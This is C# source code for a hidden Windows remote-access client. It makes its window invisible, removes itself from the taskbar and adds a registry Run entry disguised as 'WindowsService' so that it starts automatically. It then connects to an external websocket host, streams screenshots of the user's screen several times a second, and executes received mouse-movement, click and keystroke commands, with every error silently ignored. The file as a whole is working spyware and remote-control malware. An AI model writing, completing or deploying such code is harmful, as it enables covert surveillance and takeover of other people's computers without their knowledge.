using System;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace RemoteClient
{
    public class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            // Проверка дубликатов
            if (System.Diagnostics.Process.GetProcessesByName("WindowsService").Length > 1)
                return;
                
            Application.Run(new HiddenForm());
        }
    }

    public class HiddenForm : Form
    {
        private ClientWebSocket ws;
        private bool isRunning = true;
        
        public HiddenForm()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Opacity = 0;
            
            SetupAutostart();
            StartSystem();
        }

        private void SetupAutostart()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey(
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk?.SetValue("WindowsService", Application.ExecutablePath);
            }
            catch { }
        }

        private async void StartSystem()
        {
            _ = Task.Run(async () => await ConnectWebSocket());
            _ = Task.Run(async () => await StreamScreen());
        }

        private async Task ConnectWebSocket()
        {
            while (isRunning)
            {
                try
                {
                    ws = new ClientWebSocket();
                    await ws.ConnectAsync(new Uri("wss://shamantop.netlify.app/.netlify/functions/ws"), 
                                         CancellationToken.None);
                    await ReceiveCommands();
                }
                catch
                {
                    await Task.Delay(5000);
                }
            }
        }

        private async Task StreamScreen()
        {
            while (isRunning)
            {
                try
                {
                    if (ws?.State == WebSocketState.Open)
                    {
                        using (var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, 
                                                   Screen.PrimaryScreen.Bounds.Height))
                        using (var g = Graphics.FromImage(bmp))
                        {
                            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                            using (var ms = new MemoryStream())
                            {
                                bmp.Save(ms, ImageFormat.Jpeg);
                                await ws.SendAsync(ms.ToArray(), WebSocketMessageType.Binary, true, CancellationToken.None);
                            }
                        }
                    }
                    await Task.Delay(150);
                }
                catch { await Task.Delay(1000); }
            }
        }

        private async Task ReceiveCommands()
        {
            var buffer = new byte[1024];
            while (ws?.State == WebSocketState.Open)
            {
                try
                {
                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    var command = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    ExecuteCommand(command);
                }
                catch { break; }
            }
        }

        private void ExecuteCommand(string command)
        {
            try
            {
                var parts = command.Split('|');
                var action = parts[0];
                
                switch (action)
                {
                    case "MOVE":
                        var x = int.Parse(parts[1]);
                        var y = int.Parse(parts[2]);
                        Cursor.Position = new Point(x, y);
                        break;
                        
                    case "CLICK":
                        mouse_event(0x0002, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                        mouse_event(0x0004, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                        break;
                        
                    case "RIGHT":
                        mouse_event(0x0008, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                        mouse_event(0x0010, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                        break;
                        
                    case "KEY":
                        SendKeys.SendWait(parts[1]);
                        break;
                }
            }
            catch { }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(false);
        }
    }
}